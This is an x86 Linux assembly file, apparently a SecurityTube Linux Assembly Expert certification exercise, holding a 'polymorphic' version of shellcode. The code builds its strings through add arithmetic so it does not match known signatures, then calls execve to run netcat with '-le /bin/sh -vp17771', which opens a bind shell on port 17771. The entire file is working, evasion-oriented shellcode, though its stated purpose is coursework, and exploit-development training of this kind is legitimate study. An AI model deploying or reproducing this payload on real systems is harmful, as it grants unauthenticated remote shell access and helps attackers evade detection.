;//Author: Aaron Weathersby
;//SLAE #1488
;//Handle: t0b0x0r
;//github:https://github.com/t0b0rX0r/slae/upload/master/assignment6_task1
;//;Assignment #5- Polymorphic Conversion- NetCat Call
;//created for completing the requirements of the SecurityTube Linux Assembly Expert certification: http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert
global _start
section .text
 _start:
	xor eax, eax
	;xor edx, edx
	mov edx,eax ; mov zero to edx	
	;push eax
	push edx  ; same value as orginal eax

	;push 0x31373737	;-vp17771
	add eax,0x30363636
	add eax,0x01010101
	push eax
	xor eax,eax

    
	;push 0x3170762d
	add eax,0x01010101
	add eax,0x306f752c
	push eax
  	xor eax,eax

	mov esi, esp

	push eax ; replace with edx as its still zeropush eax ; 
	;push 0x68732f2f	;-le//bin//sh
	add eax,0x01010101
	add eax,0x67722e2e
	push eax
	xor eax,eax
	 push 0x6e69622f
	;add eax,0x01010101
	;add eax,0x6d68612e
	;push eax
	;xor eax,eax
    push 0x2f656c2d
    mov edi, esp

    push eax
    push 0x636e2f2f	;/bin//nc
    push 0x6e69622f
    mov ebx, esp

    ;push edx
	push dword edx
    push esi
    push edi
    push ebx
    mov ecx, esp
    ;mov al,11 
    add al,11 ; same as move 11 as eax
    int 0x80


